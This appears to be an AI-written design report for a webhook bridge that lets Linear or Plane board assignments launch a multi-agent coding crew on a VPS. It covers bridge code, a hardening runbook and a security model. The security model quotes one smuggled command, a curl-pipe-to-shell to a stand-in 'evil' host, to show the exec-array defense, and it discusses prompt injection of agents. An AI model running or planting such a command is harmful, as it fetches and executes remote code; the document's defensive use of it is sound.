## Recommendation

**Use Linear as the board, and extend dev-os/devcrew with a single "DevCrew" OAuth app installed as an Agent (app user).** Linear is the only one of the two options that natively models exactly the integration you are building, which removes the most fragile custom code from the bridge.

- **The board can PUSH an assignment event, and the agent is a first-class actor.** Linear's Agents platform lets an OAuth app authenticated with `actor=app` become a workspace member that is `@mentionable` and can have issues delegated to it; assigning/delegating an issue to that app **automatically creates an AgentSession and fires a `created` AgentSessionEvent webhook** carrying the issue, comment, context, and a ready-to-use `promptContext`. This is verified against Linear's official docs (https://linear.app/developers/agents, https://linear.app/developers/agent-interaction) and confirmed by the verification verdicts. You do not have to invent "agent-ready column" semantics or diff payloads to detect intent.
- **Agents cost zero seats.** "Agents installed in your workspace do not count as billable users" and "it does not cost anything to develop agents in Linear" (https://linear.app/pricing). Your 9-role devcrew adds no per-seat cost; only the humans driving the board are billed.
- **Clean multi-project fan-out from one identity.** One `actor=app` token has access to all public teams in the workspace, and webhooks/installs can target `allPublicTeams: true` (https://linear.app/developers/oauth-actor-authorization). Map each repo to a Linear team or project; one app reaches all 3-8 of them.
- **Strong, well-documented webhook security and progress model.** Webhooks are HMAC-SHA256 signed via `Linear-Signature` over the raw body with a 60s `webhookTimestamp` replay window and a published sender-IP allowlist (https://linear.app/developers/webhooks). The agent reports back as native `AgentActivity` events (thought/action/response/elicitation) and deep-links your PR via `externalUrls`, so the board shows live progress with no second source of truth.
- **Generous API headroom.** An OAuth app gets 5,000 requests/hr and 2,000,000 complexity points/hr, surfaced via `X-RateLimit-*` headers (https://linear.app/developers/rate-limiting) — ample for 5-10 concurrent agent sessions.

Two constraints to internalize, both confirmed: assignment registers the app as `delegate`, not `assignee` (a human keeps accountability), so the bridge keys on delegation/AgentSessionEvent, never on `assigneeId`; and the Agent APIs are an explicit **Developer Preview** subject to change before GA, so pin `@linear/sdk` and watch the changelog.

**Fallback: Plane.** Plane is the right choice if data residency is a hard requirement (Linear is SaaS-only; workspace data lives in a permanent US or EU region and account/API-key metadata is always US-resident — https://linear.app/docs/security), or if the mobile-manufacturer client forbids client/repo text transiting a third-party cloud. Plane is fully self-hostable (AGPL-3.0), runs comfortably inside your 8 vCPU / 24 GB budget (Plane's own floor is 2 vCPU / 4 GB, https://developers.plane.so/self-hosting/methods/docker-compose), and confirmed-emits HMAC-SHA256-signed outbound webhooks for issue/assignee changes (https://developers.plane.so/dev-tools/intro-webhooks). The cost: Plane has no agent/service-account concept, so you assign work to a normal Member account the agent controls, you must detect the trigger by inspecting `activity.field` on `issue`/`update` events (no native "delegated to agent" signal), and you must clear the SSRF allowlist trap (below). **Switch to Plane the moment residency/self-hosting of the board itself becomes a requirement; otherwise stay on Linear.** If both are mandated, build the receiver per-board (the bridge below already isolates this) and treat Linear as primary.

## Target architecture

```
                         INTERNET
                            |
                  (DNS: board./hooks.example.com -> Contabo IPv4)
                            |
                   +--------v---------+   :443 TLS (Let's Encrypt, auto)
                   |   Caddy proxy    |   only service publishing host ports
                   +---+----------+---+
                       |          |
        reverse_proxy  |          |  reverse_proxy /webhook/*
   (board UI, if Plane)|          |
                       |          v
        +--------------v--+   +---v---------------------+
        |  Board          |   |  Bridge (FastAPI)       |
        |  - Linear: SaaS |   |  POST /webhook/linear   |
        |    (cloud API)  |   |  POST /webhook/plane    |
        |  - Plane: self- |   |  GET  /healthz /readyz  |
        |    hosted stack |   |  GET  /runs/{id}        |
        +--------+--------+   +---+------+--------------+
                 ^                |      | verify HMAC -> dedupe -> enqueue
   write-back    |                |      |
   (GraphQL /    |        SQLite  |      |  Redis (RQ queue + dedupe locks)
    REST + token)|     (runs,     v      v
                 |      deliveries) +-----------------------+
                 |                  |  RQ worker pool (N=6) |
                 +------------------+  shells out to:       |
                                    |  devos-run / devcrew  |
                                    +-----------+-----------+
                                                |
                                 per-run git worktree under
                                 /srv/agents/work/<project>/run-<id>
                                                |
                                    +-----------v-----------+
                                    | Hermes kanban swarm   |
                                    | (9 agents: Codex/Grok |
                                    |  /OpenRouter models)  |
                                    |  ephemeral build-trace|
                                    +-----------------------+
```

Components on the VPS:

- **Caddy** — single TLS-terminating reverse proxy; the only container publishing host ports 80/443 (https://caddyserver.com/docs/automatic-https). Routes `hooks.example.com -> bridge:8080` and, for Plane, `board.example.com -> plane proxy`.
- **Bridge (FastAPI)** — stateless, tiny webhook receiver + RQ enqueuer. Verifies signatures, dedupes, maps board project -> repo, dispatches, writes status back. Binds localhost behind Caddy.
- **Redis + RQ worker pool** — async job queue; worker count is the global concurrency governor (N=6, tunable to ~10) (https://python-rq.org/docs/workers/).
- **SQLite** — mutable runtime state only: `seen_deliveries`, `active_runs`, `runs`. Project mapping is NOT here.
- **Board** — Linear (cloud, recommended) or self-hosted Plane stack (12 containers behind its own Caddy-based proxy).
- **dev-os / devcrew + Hermes** — invoked by workers as `devos-run`/`devcrew-run`; each run gets an isolated git worktree and its own auto-named Hermes kanban board (internal build-trace, never read back as authority).

## End-to-end workflow

1. **Human creates/assigns a board issue.** On Linear, a human (or a team workflow rule) **delegates** the issue to the DevCrew app, or `@mentions` it. Linear creates an AgentSession and POSTs a `created` AgentSessionEvent to `hooks.example.com/webhook/linear` (https://linear.app/developers/agent-interaction). On Plane, the equivalent is moving the card into a reserved `Agent-Ready` state (or applying an `agent:build` label) on the project the agent account belongs to, which emits an `issue`/`update` webhook.
2. **Bridge verifies and acknowledges fast.** The receiver reads the raw body, verifies the HMAC signature constant-time (Linear: `Linear-Signature` + `webhookTimestamp` <= 60s; Plane: `X-Plane-Signature`), checks the board/project against the allowlist, dedupes on the delivery id, claims the issue id, enqueues an RQ job, and returns HTTP 200 in well under Linear's 5s cap. On a Linear `created` event the worker immediately posts a `thought` AgentActivity (within the 10s window) so the session does not go stale.
3. **Worker resolves project -> repo and spins an isolated worktree.** It looks up `board_project_id` in `bridge.yaml`, gets `repo_path` + `default_branch` + `run` mode, and creates `git -C <repo_path> worktree add /srv/agents/work/<project>/run-<id> -b agent/<issue>-<short>`. Multiple projects never share a tree because each maps to a distinct `repo_path` + per-project `workdir_root`.
4. **Dispatch to the agent team.** The worker shells out via an exec array (no shell): `devos-run "<title>\n\n<body>" <repo_path>` for the research->plan->gate->build flow, or `devcrew-run` for direct build. devcrew auto-creates a per-repo Hermes kanban named from the repo basename; the 9 agents (architect/backend/frontend/devops/reviewer/qa/integrator/domain-expert/designer) run on Codex/Grok/OpenRouter models.
5. **Status write-back during the run.** The worker posts lifecycle updates to the board with the project's token: a start comment + card moved to In Progress, optional milestone comments from devcrew phases, and on Linear streams `AgentActivity` (thought -> action -> response) so the session UI shows live progress. All write-back is best-effort: a failed comment never fails the build.
6. **Human approval gate as a column round-trip (devos mode).** When `devos-run` reaches its human gate, the worker parks the run (`runs.state = awaiting_approval`, worktree held), posts the plan as a comment, and moves the card to `Awaiting Approval` (on Linear, emits an `elicitation` activity). A human moving the card to `Approved` fires a new webhook; the receiver matches the transition for the parked run and enqueues a `resume` job that signals `devos-run` to continue into build. Moving to `Rejected`/Backlog cancels the run and removes the worktree.
7. **PR + done.** On PR open, the worker comments the PR URL and, on Linear, attaches it via `agentSessionUpdate` `externalUrls`. On success it moves the card to Done / In Review; on failure it moves to a `Failed / Needs human` state with the log tail. The worktree is torn down (`git worktree remove`).
8. **Multi-project mapping.** Each repo = one Linear team (or one Plane project) <-> one `bridge.yaml` entry <-> one `repo_path` <-> one per-run worktree <-> one ephemeral Hermes board. The bridge's SQLite join key is always the **board issue id**, never the Hermes board, so the human-facing board stays the single source of truth across all 3-8 projects.

## The bridge service

Design: one FastAPI app, per-board POST paths so each verifies against its own secret and parses its own payload. The synchronous path does only verify -> dedupe -> claim -> enqueue and returns 200 fast. Heavy work runs in RQ workers (count = global concurrency cap ~8). Idempotency is two-layer: delivery-id dedupe (transport retries) plus an active-run guard on the board issue id (logical dups). Project mapping lives in a versioned `bridge.yaml`, not SQLite.

Example `bridge.yaml` entry:

```yaml
concurrency: 8
projects:
  - board: linear
    board_project_id: "team_WEB"          # Linear team id; trigger = delegation to our app
    repo_path: "/srv/agents/repos/web-app"
    default_branch: "main"
    run: "devos"                          # devos-run (research+plan+gate) | devcrew (direct build)
    workdir_root: "/srv/agents/work/web-app"
    token_env: "LINEAR_TOKEN_WEB"         # board write-back token, least-privilege
  - board: plane
    board_project_id: "9f3c-uuid-proj"
    workspace_slug: "acme"
    trigger_state: "Agent-Ready"          # or trigger_label: "agent:build"
    repo_path: "/srv/agents/repos/api"
    default_branch: "main"
    run: "devcrew"
    workdir_root: "/srv/agents/work/api"
    token_env: "PLANE_TOKEN_API"
```

Minimal runnable-shaped bridge (`bridge.py`):

```python
import hashlib, hmac, json, os, sqlite3, subprocess, time, uuid
import yaml
from fastapi import FastAPI, Request, HTTPException
from redis import Redis
from rq import Queue

CFG = yaml.safe_load(open(os.environ["BRIDGE_CONFIG"]))
PROJECTS = {p["board_project_id"]: p for p in CFG["projects"]}
LINEAR_SECRET = os.environ["LINEAR_WEBHOOK_SECRET"].encode()
PLANE_SECRET = os.environ["PLANE_WEBHOOK_SECRET"].encode()

db = sqlite3.connect("/srv/agents/bridge.db", check_same_thread=False)
db.executescript("""
CREATE TABLE IF NOT EXISTS seen_deliveries(delivery_id TEXT PRIMARY KEY, ts REAL);
CREATE TABLE IF NOT EXISTS active_runs(issue_id TEXT PRIMARY KEY, run_id TEXT, ts REAL);
CREATE TABLE IF NOT EXISTS runs(run_id TEXT PRIMARY KEY, issue_id TEXT, project TEXT,
                                state TEXT, log TEXT, pr_url TEXT, ts REAL);
""")
q = Queue("dispatch", connection=Redis(), default_timeout=60 * 60)  # 1h hard job timeout
app = FastAPI()

def verify(raw: bytes, sig: str, secret: bytes) -> bool:
    expected = hmac.new(secret, raw, hashlib.sha256).hexdigest()
    return bool(sig) and hmac.compare_digest(expected, sig)

def once(table: str, key: str) -> bool:
    # atomic claim; returns False if already present (fail-closed dedupe)
    try:
        db.execute(f"INSERT INTO {table} VALUES (?,?{',?' if table=='active_runs' else ''})",
                   (key, time.time()) if table == "seen_deliveries" else (key, None, time.time()))
        db.commit()
        return True
    except sqlite3.IntegrityError:
        return False

def enqueue(project: dict, issue_id: str, goal: str):
    if not once("seen_deliveries", project["_delivery"]):  # transport dedupe
        return
    if not once("active_runs", issue_id):                  # logical dedupe (one run per issue)
        return
    run_id = uuid.uuid4().hex
    db.execute("INSERT INTO runs VALUES (?,?,?,?,?,?,?)",
               (run_id, issue_id, project["board_project_id"], "queued", "", None, time.time()))
    db.commit()
    q.enqueue("worker.run_agent", project, issue_id, goal, run_id)

@app.post("/webhook/linear")
async def linear_hook(request: Request):
    raw = await request.body()
    if not verify(raw, request.headers.get("Linear-Signature", ""), LINEAR_SECRET):
        raise HTTPException(400, "bad signature")
    body = json.loads(raw)
    if abs(time.time() * 1000 - body.get("webhookTimestamp", 0)) > 60_000:
        raise HTTPException(400, "stale")                  # replay guard
    if body.get("type") != "AgentSessionEvent" or body.get("action") != "created":
        return {"ok": True}                                # only act on delegation/mention
    sess = body["agentSession"]
    issue = sess["issue"]
    project = PROJECTS.get(issue["team"]["id"])
    if not project:
        raise HTTPException(404, "unknown project")        # allowlist is the trust boundary
    project = {**project, "_delivery": request.headers["Linear-Delivery"],
               "agent_session_id": sess["id"]}
    enqueue(project, issue["id"], f'{issue["title"]}\n\n{issue.get("description","")}')
    return {"ok": True}

@app.post("/webhook/plane")
async def plane_hook(request: Request):
    raw = await request.body()
    if not verify(raw, request.headers.get("X-Plane-Signature", ""), PLANE_SECRET):
        raise HTTPException(400, "bad signature")
    body = json.loads(raw)
    project = PROJECTS.get(body.get("data", {}).get("project"))
    act = body.get("activity", {})
    # trigger only on the transition INTO the agent-owned state, not every edit
    if not project or body.get("event") != "issue" or \
       act.get("field") != "state" or act.get("new_value") != project.get("trigger_state"):
        return {"ok": True}
    project = {**project, "_delivery": request.headers["X-Plane-Delivery"]}
    d = body["data"]
    enqueue(project, d["id"], f'{d["name"]}\n\n{d.get("description_stripped","")}')
    return {"ok": True}

@app.get("/healthz")
def healthz(): return {"ok": True}

@app.get("/readyz")
def readyz():
    Redis().ping(); db.execute("SELECT 1")
    return {"ok": True}

@app.get("/runs/{run_id}")
def get_run(run_id: str):
    row = db.execute("SELECT run_id,issue_id,project,state,pr_url FROM runs WHERE run_id=?",
                     (run_id,)).fetchone()
    if not row:
        raise HTTPException(404)
    return dict(zip(["run_id", "issue_id", "project", "state", "pr_url"], row))
```

The worker (`worker.py`, sketch) shells out with `shell=False` and writes status back:

```python
import subprocess, sqlite3, time
import httpx

db = sqlite3.connect("/srv/agents/bridge.db", check_same_thread=False)

def run_agent(project, issue_id, goal, run_id):
    wt = f'{project["workdir_root"]}/run-{run_id}'
    subprocess.run(["git", "-C", project["repo_path"], "worktree", "add",
                    wt, "-b", f"agent/{issue_id}-{run_id[:8]}"], check=True)
    post_status(project, issue_id, f"Agent run started (run {run_id})")  # best-effort
    db.execute("UPDATE runs SET state='running' WHERE run_id=?", (run_id,)); db.commit()
    cmd = ["devos-run" if project["run"] == "devos" else "devcrew-run", goal, wt]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=2700)  # 45m wall-clock
        state = "done" if out.returncode == 0 else "failed"
        post_status(project, issue_id, (out.stdout or out.stderr)[-1500:])
    except subprocess.TimeoutExpired:
        state = "failed"; post_status(project, issue_id, "Run timed out (45m) and was killed.")
    finally:
        subprocess.run(["git", "-C", project["repo_path"], "worktree", "remove", "--force", wt])
        db.execute("DELETE FROM active_runs WHERE issue_id=?", (issue_id,))
        db.execute("UPDATE runs SET state=? WHERE run_id=?", (state, run_id)); db.commit()

def post_status(project, issue_id, text):
    # Plane: POST .../work-items/{id}/comments/ with X-API-Key; Linear: agentActivityCreate / commentCreate
    try:
        ...  # use project["token_env"]; never raise into the build
    except Exception:
        pass
```

This shape (verify -> enqueue -> fast 200 -> idempotent worker) is the canonical 2026 Python webhook pattern (https://oneuptime.com/blog/post/2026-01-25-webhook-handlers-python/view). Concurrency is set by starting N workers (`rq worker-pool -n 6 dispatch`), per https://python-rq.org/docs/workers/.

## Contabo deployment runbook

Target: Contabo VPS, Ubuntu 24.04, 8 vCPU / 24 GB, single IPv4.

1. **Provision + base hardening.** Create a non-root `deploy` user: `sudo adduser deploy`. SSH-key only — copy your key (`ssh-copy-id deploy@host`), then in `/etc/ssh/sshd_config.d/10-hardening.conf` set `PermitRootLogin no`, `PasswordAuthentication no`, `PubkeyAuthentication yes`; `sudo systemctl restart ssh`. Install fail2ban with an `[sshd]` jail (`maxretry=5`, `bantime=1h`) and `sudo systemctl enable --now fail2ban` (https://www.101howto.com/secure-ubuntu-24-04-server-2026/). Install unattended-upgrades: `sudo apt install unattended-upgrades && sudo dpkg-reconfigure --priority=low unattended-upgrades` (https://help.ubuntu.com/community/AutomaticSecurityUpdates).
2. **Firewall.** `sudo ufw default deny incoming`; `sudo ufw default allow outgoing`; `sudo ufw allow OpenSSH`; `sudo ufw allow 80/tcp`; `sudo ufw allow 443/tcp`; `sudo ufw enable`. **Critical:** Docker bypasses ufw for any `-p` published port, so only Caddy publishes ports; every other service stays on the internal compose network with no host mapping (https://www.101howto.com/secure-ubuntu-24-04-server-2026/).
3. **Docker Engine + Compose v2** from Docker's official apt repo (not Ubuntu's): add the keyring and `docker.sources`, then `sudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin`; verify `docker compose version` (https://docs.docker.com/engine/install/ubuntu/). Add the deploy user: `sudo usermod -aG docker deploy` (root-equivalent; keep agent work inside containers) (https://docs.docker.com/engine/install/linux-postinstall/).
4. **Cap container logs** (default is unbounded and will fill the disk). Write `/etc/docker/daemon.json`: `{ "log-driver": "json-file", "log-opts": { "max-size": "10m", "max-file": "3" } }`, then `sudo systemctl restart docker` (https://docs.docker.com/config/containers/logging/json-file/).
5. **Swap as an OOM buffer.** `fallocate -l 8G /swapfile; chmod 600 /swapfile; mkswap /swapfile; swapon /swapfile`; persist in `/etc/fstab`; set `vm.swappiness=10` in `/etc/sysctl.d/99-swap.conf` (https://docs.docker.com/engine/containers/resource_constraints/).
6. **Compose stack** at `/opt/devstack/docker-compose.yml` (services). For Linear-primary, no board container is needed:
   - `bridge` (FastAPI/uvicorn, the code above), no host ports, `restart: unless-stopped`, `mem_limit: 512m`, `env_file: ./secrets/bridge.env`.
   - `worker` (RQ worker-pool, command `rq worker-pool -n 6 dispatch`), `restart: unless-stopped`, mounts `/srv/agents` and the agent secrets read-only; `mem_limit` left generous (it spawns agent subprocesses).
   - `redis` (`valkey/valkey:7.2-alpine`), internal only, named volume.
   - `caddy` (publishes only `80:80`, `443:443`), volumes for `/data` and `/config`.
   - For Plane-primary, also run the Plane stack from its own release-pinned `setup.sh` (https://github.com/makeplane/plane/blob/master/deployments/cli/community/README.md), set `WEBHOOK_ALLOWED_HOSTS` to include the `bridge` container hostname (the single most likely thing to silently break delivery — https://github.com/makeplane/plane/blob/master/deployments/cli/community/variables.env), and route Caddy `board.example.com` to Plane's proxy.
   Set `restart: unless-stopped` on every service and per-agent `mem_limit`/`cpus` so one runaway build cannot OOM the host (https://docs.docker.com/engine/containers/resource_constraints/).
7. **Reverse proxy + TLS (Caddy).** `Caddyfile`:
   ```
   hooks.example.com { reverse_proxy bridge:8080 }
   board.example.com { reverse_proxy plane-proxy:80 }   # only if self-hosting Plane
   ```
   Create A records for both hostnames -> the Contabo IPv4; Caddy auto-provisions and renews Let's Encrypt certs over port 80 and redirects HTTP->HTTPS (https://caddyserver.com/docs/automatic-https). Internal services are never host-published.
8. **Secrets layout.** Per-stack `.env` files under `/opt/devstack/secrets/`, `chmod 600`, owned by deploy, git-ignored: `bridge.env` (webhook signing secrets, board write-back tokens), and `agent.env` (`OPENROUTER_API_KEY` + Codex/Grok creds). Inject via `env_file:` so they stay out of `docker inspect`; mount file-based OAuth creds as a read-only `~/.config` volume into the agent containers (https://docs.docker.com/compose/how-tos/environment-variables/set-environment-variables/). Reminder: these creds drive Codex/Grok/OpenRouter only, never Claude/Gemini.
9. **Systemd boot unit.** `/etc/systemd/system/devstack.service`: `[Unit] Requires=docker.service After=docker.service`; `[Service] Type=oneshot RemainAfterExit=yes WorkingDirectory=/opt/devstack ExecStart=/usr/bin/docker compose up -d ExecStop=/usr/bin/docker compose down`; `[Install] WantedBy=multi-user.target`. Then `sudo systemctl enable --now devstack` and `sudo systemctl enable docker containerd`. Use restart policies OR systemd for boot, not both on the same container (https://docs.docker.com/engine/containers/start-containers-automatically/).
10. **Backups.** Nightly systemd timer on deploy: if self-hosting Plane, `docker compose exec -T plane-db pg_dump -U plane plane | gzip > /opt/backups/board-$(date +%F).sql.gz`; always `tar czf /opt/backups/bridge-$(date +%F).tgz /opt/devstack/secrets /opt/devstack/bridge.yaml /opt/devstack/Caddyfile /srv/agents/bridge.db`. Push offsite to Contabo Object Storage (S3-compatible, flat pricing, ~32 TB egress included) via rclone with **versioning + object lock** enabled: `rclone copy /opt/backups contabo-s3:devstack-backups` (https://contabo.com/en/object-storage/). Prune local to 14 days. Pair with Contabo's snapshot / Auto Backup add-on for whole-image recovery (https://contabo.com/en/pricing/).

Resource budget (8 vCPU / 24 GB):

| Component | RAM | Notes |
|---|---|---|
| OS + Docker daemon | ~1-1.5 GB | baseline |
| Caddy | ~0.1 GB | one proxy, fixed routes |
| Bridge (FastAPI) | ~0.25-0.5 GB | stateless, `mem_limit: 512m` |
| Redis/Valkey | ~0.1-0.3 GB | queue + dedupe |
| SQLite | negligible | runtime state |
| Plane stack (only if self-hosted) | ~3-5 GB | 12 containers incl. Postgres/Valkey/RabbitMQ/MinIO |
| Agents (5-10 concurrent) | ~1.5-2.5 GB each | I/O-bound (remote models); cap each `mem_limit: 2g` |
| **Total comfortable** | **~18-20 GB** | **N=6 heavy agents is the sweet spot; queue the rest** |

**Add swap: yes** — 8 GB at `swappiness=10`, as an OOM safety net so a transient build spike degrades to slowness instead of killing a container mid-task (https://docs.docker.com/engine/containers/resource_constraints/). On Linear-primary you skip the Plane stack's 3-5 GB, leaving even more headroom for agents.

## Security model

The bridge converts an inbound HTTP webhook into a shell invocation of an autonomous agent that edits code and runs arbitrary tools, so treat it as a deliberately exposed RCE surface. The five load-bearing controls:

1. **Exec array, never a shell string.** Spawn `subprocess.run(["devos-run", goal, repo_path], shell=False)` — never `os.system`, `shell=True`, or string concatenation. The issue title/body is passed as a positional **data** argument and is never parsed as a command, so shell metacharacters in an issue (`'; curl evil|sh #`) are inert. Strip control chars and cap goal length (~4-8 KB) first.
2. **Hardcoded project allowlist is the trust boundary.** The repo path comes only from `bridge.yaml`, never from a webhook field; reject unknown boards/projects/events with a 4xx + audit and no dispatch. Canonicalize the resolved path and assert it stays under the repos root (defends against `..`/symlink traversal).
3. **Signature verification, fail-closed, first.** Verify HMAC-SHA256 over the **raw** body before anything else: Linear `Linear-Signature` (hex) + reject `webhookTimestamp` >60s old (https://linear.app/developers/webhooks); Plane `X-Plane-Signature` + dedupe on `X-Plane-Delivery` (Plane has no signed timestamp and retries with backoff, so dedupe is mandatory — https://developers.plane.so/dev-tools/intro-webhooks). Constant-time compare; a forged or replayed payload must never launch a build. Optionally IP-allowlist Linear's published sender IPs at Caddy.
4. **Sandboxed, non-root, isolated per run.** Run the bridge and agents as a dedicated unprivileged user, each run in its own `git worktree` (no shared trees), ideally inside a rootless container with CPU/memory/pids limits and **egress restricted to the model providers + git remotes** so a prompt-injected agent cannot exfiltrate. Issue text becomes the agent's prompt, so this is a prompt-injection surface too — keep the `devos-run` human gate mandatory for any externally-creatable issue, and scope board write-back tokens to comment/update on the specific workspace only (a dedicated bot identity, not a human admin token).
5. **Spend caps — dev-os has none today, so the bridge enforces them.** Per-key OpenRouter credit ceilings (mint a low-cap key per project — https://openrouter.ai/docs/api-reference/limits), a hard 45-minute wall-clock timeout that kills the process group, the RQ worker count as a concurrency cap (~8), a per-project daily run quota, and a kill-switch sentinel file (`/srv/agents/PAUSED`) checked before every dispatch plus a one-command "stop all". Emit one structured JSON audit record per dispatch and outcome, keyed to the board issue id, the delivery id, the argv array (never a shell string), the agent exit code, and cost.

**Paperclip (optional, later).** Paperclip (paperclipai/paperclip) is a reasonable later governance/budget control-plane — org-chart, per-team budgets, policy — if you outgrow env-level caps. It is **not** required for v1: per-key credit limits + wall-clock timeout + concurrency cap + kill-switch cover the v1 risk. Add it only when you need cross-project budget governance beyond what OpenRouter keys and the bridge quota table provide.

## Phased build plan

**v0 — prove the loop (local / dev workspace, ~1-2 days).**
- One Linear dev workspace; register the DevCrew OAuth app (`actor=app`, scopes `read, write, issues:create, comments:create, app:assignable, app:mentionable`); store `viewer.id` + token.
- Minimal FastAPI receiver for `/webhook/linear` only: verify `Linear-Signature` + timestamp, log payload, return 200; expose locally via a tunnel for testing.
- Hardcode ONE project -> repo mapping. Synchronously (no queue yet) run `devcrew-run` on a delegated issue and post a single result comment back.
- Acceptance: delegating an issue to the app triggers one devcrew run and one comment lands on the issue.

**v1 — production on the Contabo VPS, single project (~3-5 days).**
- Full base-box hardening, Docker + Compose, Caddy TLS, systemd boot unit, capped logs, 8 GB swap (runbook above).
- Bridge + Redis + RQ worker (N=6) in compose; SQLite dedupe (delivery id + active-run guard) and the `runs` table; `/healthz`, `/readyz`, `/runs/{id}`.
- Exec-array dispatch, per-run git worktree, 45m timeout + kill, structured audit log, kill-switch file, per-key OpenRouter ceiling, scoped write-back token.
- `devos-run` human gate mapped to the `Awaiting Approval -> Approved` column round-trip; stream `AgentActivity` (thought within 10s, action, response) and PR via `externalUrls`.
- Nightly backups to Contabo Object Storage (versioned + object-locked); startup reconciliation sweep (prune orphan worktrees, mark stranded `running` rows failed + write back).
- Acceptance: a real issue runs end-to-end on the VPS, survives a reboot mid-build (reconciliation closes it out), and the gate works.

**v2 — multi-project, concurrency, governance (~1 week).**
- `bridge.yaml` for all 3-8 projects with per-project `repo_path`, `run` mode, `workdir_root`, `token_env`, and optional `max_concurrent` sub-cap; load on startup + SIGHUP.
- Per-repo Hermes boards auto-named; tune N toward ~10 after load-testing real per-agent footprint on the box; add the per-project semaphore so one noisy project cannot starve others.
- Dead-letter queue with guaranteed board write-back on exhausted retries; per-project daily/monthly run quotas.
- Add the Plane receiver path if/when a residency-constrained project needs a self-hosted board (clear the `WEBHOOK_ALLOWED_HOSTS` SSRF trap); branch the bridge per provider.
- Optional: evaluate Paperclip as a budget/governance plane once cross-project spend needs central policy.

## Open questions / risks

- **All four core claims came back `confirmed`** (Plane outbound webhooks incl. assignee changes; Linear `actor=app` agent assignable + HMAC webhooks; Plane stack fits 8 vCPU/24 GB; Plane REST API for multi-project CRUD). None were refuted. The verdicts add three nuances that shape the design: (a) a Plane assignee/state change is delivered as an `issue`/`update` webhook with the changed field in the `activity` object, **not** a dedicated event — the bridge must inspect `activity.field`/`new_value`, as coded above; (b) Linear assignment sets the app as `delegate`, **not** `assignee` — never key logic on `assigneeId`; (c) the Plane and Linear verifications were done via the GitHub API and official docs because WebSearch/WebFetch were intermittently returning HTTP 529 during research — the algorithm/header details are corroborated but the live rendered pages were not always reachable.
- **Linear Agent APIs are an explicit Developer Preview** and may change before GA. This is the single biggest external risk to v1 since the design leans on AgentSession/AgentActivity semantics. Mitigation: pin `@linear/sdk`, watch the changelog, and keep a fallback trigger (a label or a normal-bot-user assignment) so a breaking change does not take the bridge down.
- **Strict Linear timing** (HTTP 200 within 5s; first activity or externalUrl within 10s on a `created` session or it goes stale) vs. long-running `devos-run`. Mitigation already in the design: ACK immediately, post a `thought` synchronously, run the build async.
- **Plane SSRF allowlist trap** (only relevant if you self-host Plane): default config silently drops webhooks to private IPs/hostnames. The bridge receives nothing until `WEBHOOK_ALLOWED_HOSTS`/`WEBHOOK_ALLOWED_IPS` includes it and the api+worker are restarted (https://github.com/makeplane/plane/blob/master/deployments/cli/community/variables.env).
- **Plane multi-fire / missed updates.** Plane is known to emit multiple webhook events for one state change and some self-hosted versions failed to fire `issue.update` at all; pin/verify the deployed Plane version supports the chosen trigger before relying on it (the delivery-id dedupe + transition-detection above defends against the multi-fire case).
- **Single VPS = single point of failure** (one IPv4, no managed LB on Contabo — https://contabo.com/en/pricing/). A host failure takes the board (if Plane) + all agents down. Mitigation for this scale: reliable snapshots/Auto Backup + a tested restore runbook; a warm standby only if uptime needs grow.
- **dev-os budget enforcement is external-only.** Until/unless the agent runtime honors a max-cost/max-token env var (unconfirmed), the per-key OpenRouter ceiling + wall-clock timeout + concurrency cap are the only things between you and a runaway bill. Confirm whether the Codex/Grok/OpenRouter client in devcrew honors a spend env var; if it does, set it as a second layer.
- **Residency for the mobile-manufacturer client.** If client/repo text in issues cannot transit a third-party cloud, Linear is disqualified for that workspace and you fall back to self-hosted Plane for it — decide this per project before wiring boards.
- **Unverified detail to confirm before implementing Plane's compare:** Plane's exact `X-Plane-Signature` encoding (hex vs base64) and whether it signs the raw body or a canonicalized form — verify against the deployed version's source, since the docs endpoints were flaky during research.